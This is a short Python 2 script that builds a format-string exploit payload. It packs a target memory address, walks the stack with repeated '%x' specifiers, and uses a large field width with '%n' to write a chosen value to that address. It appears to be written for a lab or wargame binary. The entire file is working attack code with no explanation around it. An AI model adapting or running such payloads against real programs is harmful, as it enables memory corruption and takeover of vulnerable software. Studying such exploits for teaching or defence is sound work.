#!/usr/bin/env python

import os
import struct

def main():
    payload = ""
    payload += struct.pack("I", 0x8049810)
    payload += "%x."*10
    payload += "%16930041x."
    payload += "%n."
    print payload

main()
